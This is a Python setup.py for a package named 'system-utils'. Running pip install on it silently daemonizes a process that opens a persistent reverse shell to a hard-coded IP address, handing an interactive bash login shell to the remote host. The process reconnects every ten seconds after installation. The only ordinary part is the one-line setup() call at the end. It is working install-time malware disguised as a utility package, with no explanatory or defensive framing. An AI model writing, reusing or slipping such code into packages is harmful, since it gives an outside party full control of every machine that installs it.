from setuptools import setup
import os
import sys
import socket
import subprocess
import time
import pty

def proper_daemonize():
    """Completely detach from parent process"""
    try:
        # First fork - detach from parent
        pid = os.fork()
        if pid > 0:
            # Parent process exits
            return True  # Signal that we're done
        
        # Child continues - become session leader
        os.setsid()
        os.chdir('/')
        os.umask(0)
        
        # Second fork - ensure we're not a session leader
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Exit second parent
        
        # Now completely independent process
        return False  # Signal that we're the daemon
        
    except Exception as e:
        return True

def persistent_backdoor():
    # This runs in the completely detached process
    time.sleep(3)  # Give pip time to finish
    
    ATTACKER_IP = "142.93.23.15"
    ATTACKER_PORT = 80
    
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            s.send(b"\n[+] PERSISTENT BACKDOOR ACTIVE\n")
            s.send(b"[+] This survives after pip install!\n")
            s.send(b"[+] Will reconnect if connection drops\n\n$ ")
            
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Use pty for better shell
            pty.spawn(["/bin/bash", "--login"])
            
        except:
            time.sleep(10)  # Wait before reconnecting
            continue

# This runs during pip install
if proper_daemonize():
    # Parent process - just continue with setup
    pass
else:
    # Child daemon process - run backdoor
    persistent_backdoor()
    sys.exit(0)  # Daemon exits if backdoor fails

# Normal setup continues
setup(name="system-utils", version="1.0.0")
